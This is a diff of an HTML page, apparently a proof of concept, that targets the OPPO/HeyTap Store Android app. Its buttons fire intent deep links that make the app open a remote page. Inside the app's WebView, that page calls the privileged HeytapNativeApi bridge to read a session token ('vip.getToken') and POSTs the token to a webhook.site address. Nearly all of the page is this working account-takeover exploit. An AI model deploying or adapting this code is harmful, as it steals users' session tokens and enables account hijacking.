@@ -3,66 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPPO Store Security Proof</title>
+    <title>OPPO Store Exploit Test</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; }
-        .btn { padding: 15px 30px; font-size: 18px; color: white; border: none; border-radius: 8px; cursor: pointer; margin: 10px; }
-        .primary { background-color: #ff6600; }
-        .secondary { background-color: #333; }
-        #status { margin-top: 20px; font-weight: bold; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
+        .btn { width: 100%; max-width: 320px; padding: 18px; margin: 12px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 10px; cursor: pointer; }
+        .scheme1 { background-color: #008f39; } /* oppomarket:// */
+        .scheme2 { background-color: #007bff; } /* heytap:// */
+        .scheme3 { background-color: #6f42c1; } /* store:// */
+        #log { text-align: left; background: #fff; padding: 15px; font-family: monospace; font-size: 11px; margin-top: 20px; border: 1px solid #ccc; max-height: 200px; overflow-y: auto; }
     </style>
 </head>
 <body>
 
-    <h1>HeyTap / OPPO Store Exploit Test</h1>
-    <p>Click the orange button to trigger the app. If it fails, try the black button.</p>
+    <h2>OPPO Store Deep Link Test</h2>
+    <p>Targeting: <b>com.heytap.store</b></p>
 
-    <button class="btn primary" onclick="launchExploit('com.heytap.store')">Launch Exploit (Default)</button>
-    <br>
-    <button class="btn secondary" onclick="launchExploit('com.heytap.mall')">Launch Exploit (Backup ID)</button>
+    <button class="btn scheme1" onclick="launch('oppomarket')">Scheme: oppomarket://</button>
+    <button class="btn scheme2" onclick="launch('heytap')">Scheme: heytap://</button>
+    <button class="btn scheme3" onclick="launch('store')">Scheme: store://</button>
 
-    <p id="status">Status: Waiting for user action...</p>
+    <div id="log">Status Log:<br></div>
 
     <script>
-        const webhookUrl = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
         const targetUrl = "https://pk009900.github.io/my-oppo-test/";
+        const webhook = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
+        const pkg = "com.heytap.store";
 
-        function launchExploit(packageId) {
-            document.getElementById("status").innerText = "Status: Launching intent for " + packageId + "...";
-            
-            // Standard Intent URL for Chrome to force open the OPPO Store
-            const intentLink = `intent://credits?url=${targetUrl}#Intent;scheme=oppomarket;package=${packageId};S.browser_fallback_url=${targetUrl};end`;
-            
-            window.location.href = intentLink;
+        function log(msg) {
+            document.getElementById("log").innerHTML += "> " + msg + "<br>";
         }
 
-        // --- EXFILTRATION LOGIC (Runs when loaded inside the OPPO Store WebView) ---
-        
-        function leak_callback(data) {
-            document.getElementById("status").innerText = "Status: BRIDGE DETECTED! Token captured.";
+        function launch(scheme) {
+            log("Trying scheme: " + scheme + " for " + pkg);
             
-            fetch(webhookUrl, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    vulnerability: "ATO_JSAPI_HIJACK",
-                    app: "OPPO_STORE",
-                    token_payload: data
-                })
-            });
+            // Standard Intent format with fallback
+            const intent = `intent://credits?url=${targetUrl}#Intent;scheme=${scheme};package=${pkg};S.browser_fallback_url=${targetUrl};end`;
+            
+            window.location.href = intent;
         }
 
+        // Bridge Logic: Only runs if the page is successfully loaded INSIDE the app
         window.onload = function() {
-            // Check if the privileged JSAPI bridge is available
             if (window.HeytapNativeApi) {
-                document.getElementById("status").innerText = "Status: Privileged environment detected. Calling API...";
-                
-                try {
-                    // This is the sensitive call that steals the session token
-                    window.HeytapNativeApi.invoke("vip.getToken", "leak_callback");
-                } catch (e) {
-                    console.error("Bridge call failed: ", e);
-                }
+                log("<b>SUCCESS: BRIDGE DETECTED!</b>");
+                window.HeytapNativeApi.invoke("vip.getToken", (data) => {
+                    log("Token captured! Sending to Webhook...");
+                    fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+                });
+            } else {
+                log("Ready. Click a button to launch.");
             }
         };
     </script>
